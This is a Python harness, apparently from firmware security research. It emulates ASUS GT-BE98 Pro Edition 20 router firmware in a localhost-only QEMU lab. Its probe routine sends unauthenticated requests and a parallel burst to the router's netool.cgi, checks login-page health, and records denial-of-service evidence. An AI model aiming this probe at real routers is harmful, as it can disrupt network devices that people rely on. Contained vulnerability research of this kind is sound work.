#!/usr/bin/env python3
"""Build and validate the GT-BE98 Pro Edition 20 net-tool lead in isolation."""

from __future__ import annotations

from concurrent.futures import ThreadPoolExecutor
import os
import shutil
import socket
import subprocess
import sys
import time
import urllib.parse
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
ROOTFS = ROOT / "known_firmware/extracted/87681575e1f4a362/rootfs-squashfs"
LAB = ROOT / "known_firmware/emulation/ASUS_GT-BE98_Pro_Edition_20/full-system-lab"
INIT = ROOT / "known_firmware/emulation/ASUS_GT-BE98_Pro_Edition_20/netool_full_system_init"
BOOT_INIT = ROOT / "known_firmware/emulation/ASUS_GT-BE98_Pro/boot_init"
NVRAM_SOURCE = (
    ROOT
    / "known_firmware/emulation/ASUS_RP-AX56/51891-component-rootfs"
)
STAGING = Path("/tmp/friday-gtbe98e20-root")
BOOT_STAGING = Path("/tmp/friday-gtbe98e20-boot")
KVER = "5.15.0-186-generic"
KTREE = Path("/tmp/friday-arm64-kernel")
KERNEL = KTREE / f"boot/vmlinuz-{KVER}"
MODULES = KTREE / f"lib/modules/{KVER}"
QEMU = Path("/tmp/qemu-system-arm-local/usr/bin/qemu-system-aarch64")
BUSYBOX = Path("/tmp/friday-arm64-busybox/bin/busybox")
ARM32_STRACE = (
    ROOT / "known_firmware/extracted/e6f2fe38e6ad0fa0/manual-rootfs/bin/strace"
)
DISK = LAB / "gtbe98e20-netool-root.ext4"
INITRD = LAB / "gtbe98e20-boot.cpio.gz"
SERIAL = LAB / "serial.log"
QEMU_LOG = LAB / "qemu.log"
PIDFILE = LAB / "qemu.pid"
RESULT = LAB / "netool-dos-evidence-2026-07-24.txt"
HOST_PORT = 39_280
HOST_WAN_PORT = 39_281
BURST = 40
PARALLEL = 20


def run(command: list[str], **kwargs: object) -> subprocess.CompletedProcess:
    return subprocess.run(command, check=True, **kwargs)


def build() -> None:
    required = (
        ROOTFS, INIT, BOOT_INIT, KERNEL, MODULES, QEMU, BUSYBOX, ARM32_STRACE
    )
    missing = [str(path) for path in required if not path.exists()]
    if missing:
        raise SystemExit("missing prerequisites: " + ", ".join(missing))
    LAB.mkdir(parents=True, exist_ok=True)
    shutil.rmtree(STAGING, ignore_errors=True)
    shutil.copytree(ROOTFS, STAGING, symlinks=True)
    for name in ("proc", "sys", "dev", "run", "tmp"):
        path = STAGING / name
        if path.is_symlink():
            path.unlink()
        path.mkdir(parents=True, exist_ok=True)
    shutil.copytree(MODULES, STAGING / f"lib/modules/{KVER}", symlinks=True)
    (STAGING / "greenhouse").mkdir(exist_ok=True)
    shutil.copy2(BUSYBOX, STAGING / "greenhouse/busybox")
    shutil.copy2(ARM32_STRACE, STAGING / "greenhouse/strace")
    os.chmod(STAGING / "greenhouse/strace", 0o755)
    shutil.copy2(INIT, STAGING / "init")
    os.chmod(STAGING / "init", 0o755)
    shutil.copy2(NVRAM_SOURCE / "lib/libnvram-faker.so", STAGING / "lib/libnvram-faker.so")
    shutil.copy2(NVRAM_SOURCE / "gh_nvram.ini", STAGING / "gh_nvram.ini")
    shutil.copytree(NVRAM_SOURCE / "gh_nvram", STAGING / "gh_nvram", dirs_exist_ok=True)

    DISK.unlink(missing_ok=True)
    run(["truncate", "-s", "1600M", str(DISK)])
    run(["mkfs.ext4", "-q", "-F", "-d", str(STAGING), str(DISK)])

    shutil.rmtree(BOOT_STAGING, ignore_errors=True)
    for name in ("bin", "dev", "proc", "sys", "newroot"):
        (BOOT_STAGING / name).mkdir(parents=True, exist_ok=True)
    shutil.copy2(BUSYBOX, BOOT_STAGING / "bin/busybox")
    shutil.copy2(BOOT_INIT, BOOT_STAGING / "init")
    shutil.copy2(
        MODULES / "kernel/drivers/block/virtio_blk.ko",
        BOOT_STAGING / "virtio_blk.ko",
    )
    command = (
        f"cd '{BOOT_STAGING}' && find . -print0 | cpio --null -o "
        f"--format=newc 2>/dev/null | gzip -1 > '{INITRD}'"
    )
    run(["/bin/sh", "-c", command])


def qemu_command() -> list[str]:
    lan = (
        "user,id=lan,restrict=on,net=10.0.2.0/24,"
        f"hostfwd=tcp:127.0.0.1:{HOST_PORT}-10.0.2.15:80"
    )
    return [
        str(QEMU), "-M", "virt", "-cpu", "cortex-a72", "-smp", "2",
        "-m", "2048M", "-kernel", str(KERNEL), "-initrd", str(INITRD),
        "-drive", f"file={DISK},if=none,format=raw,id=root",
        "-device", "virtio-blk-device,drive=root",
        "-append", "console=ttyAMA0 root=/dev/vda rw rootwait init=/init panic=-1",
        "-nographic", "-monitor", "none", "-serial", f"file:{SERIAL}",
        "-netdev",
        (
            "user,id=wan,restrict=on,net=192.0.2.0/24,"
            f"hostfwd=tcp:127.0.0.1:{HOST_WAN_PORT}-192.0.2.15:80"
        ),
        "-device", "virtio-net-device,netdev=wan,mac=52:54:00:98:20:01",
        "-netdev", lan,
        "-device", "virtio-net-device,netdev=lan,mac=52:54:00:98:20:02",
        "-no-reboot",
    ]


def start() -> None:
    stop()
    SERIAL.unlink(missing_ok=True)
    QEMU_LOG.unlink(missing_ok=True)
    with QEMU_LOG.open("wb") as log:
        process = subprocess.Popen(qemu_command(), stdout=log, stderr=subprocess.STDOUT)
    PIDFILE.write_text(str(process.pid) + "\n")
    wait_ready()


def stop() -> None:
    if not PIDFILE.exists():
        return
    try:
        pid = int(PIDFILE.read_text())
        cmdline = Path(f"/proc/{pid}/cmdline")
        if cmdline.exists() and b"qemu-system-aarch64" in cmdline.read_bytes():
            os.kill(pid, 15)
            time.sleep(1)
    except (ValueError, ProcessLookupError, PermissionError):
        pass
    PIDFILE.unlink(missing_ok=True)


def wait_ready(timeout: float = 120) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        text = SERIAL.read_text(errors="replace") if SERIAL.exists() else ""
        if "FRIDAY_GTBE98E20_READY=1" in text:
            return
        if "Kernel panic" in text:
            raise SystemExit("guest kernel panic; inspect serial.log")
        time.sleep(0.5)
    raise SystemExit("guest readiness timed out; inspect serial.log")


def exchange(path: str, timeout: float) -> tuple[bool, float, bytes]:
    request = (
        f"GET {path} HTTP/1.1\r\n"
        "Host: 10.0.2.15\r\nConnection: close\r\n\r\n"
    ).encode()
    started = time.monotonic()
    try:
        with socket.create_connection(("127.0.0.1", HOST_PORT), timeout=timeout) as client:
            client.sendall(request)
            client.shutdown(socket.SHUT_WR)
            response = bytearray()
            while chunk := client.recv(4096):
                response.extend(chunk)
        return response.startswith(b"HTTP/"), time.monotonic() - started, bytes(response)
    except OSError:
        return False, time.monotonic() - started, b""


def probe() -> None:
    wait_ready()
    lines = [
        "scope=localhost-only QEMU full-system lab",
        "firmware=ASUS GT-BE98 Pro Edition 20 3.0.0.6.102_39271",
        f"burst={BURST}",
        f"parallel={PARALLEL}",
    ]
    ok, elapsed, response = exchange("/Main_Login.asp", 12)
    lines.append(f"baseline_ok={str(ok).lower()} seconds={elapsed:.3f} bytes={len(response)}")
    if not ok:
        RESULT.write_text("\n".join(lines) + "\n")
        raise SystemExit("httpd baseline is not healthy")

    query = urllib.parse.urlencode(
        {
            "type": "3",
            "target": "192.0.2.1",
            "pcnt": "1",
            "response": "10",
            "exec": "10",
        }
    )
    path = "/netool.cgi?" + query
    one_ok, one_elapsed, one_response = exchange(path, 12)
    status_count = one_response.count(b"HTTP/1.")
    lines.append(
        f"single_no_session_ok={str(one_ok).lower()} seconds={one_elapsed:.3f} "
        f"bytes={len(one_response)} status_lines={status_count}"
    )

    with ThreadPoolExecutor(max_workers=PARALLEL) as pool:
        results = list(pool.map(lambda _: exchange(path, 8), range(BURST)))
    lines.append(f"burst_http_ok={sum(ok for ok, _, _ in results)}/{BURST}")
    lines.append(f"burst_timeouts={sum(not ok for ok, _, _ in results)}")
    for index in range(1, 11):
        ok, elapsed, response = exchange("/Main_Login.asp", 6)
        lines.append(
            f"control={index} ok={str(ok).lower()} seconds={elapsed:.3f} "
            f"bytes={len(response)}"
        )
    serial = SERIAL.read_text(errors="replace")
    health = [line for line in serial.splitlines() if "FRIDAY_GTBE98E20_HEALTH" in line]
    lines.extend("serial:" + line for line in health[-30:])
    RESULT.write_text("\n".join(lines) + "\n")
    print("\n".join(lines))


def main() -> int:
    if len(sys.argv) != 2 or sys.argv[1] not in {
        "build", "start", "foreground", "probe", "stop", "run"
    }:
        print(f"usage: {sys.argv[0]} build|start|foreground|probe|stop|run")
        return 2
    command = sys.argv[1]
    if command in {"build", "run"}:
        build()
    if command in {"start", "run"}:
        start()
    if command == "foreground":
        SERIAL.unlink(missing_ok=True)
        return subprocess.run(qemu_command()).returncode
    if command in {"probe", "run"}:
        try:
            probe()
        finally:
            if command == "run":
                stop()
    if command == "stop":
        stop()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
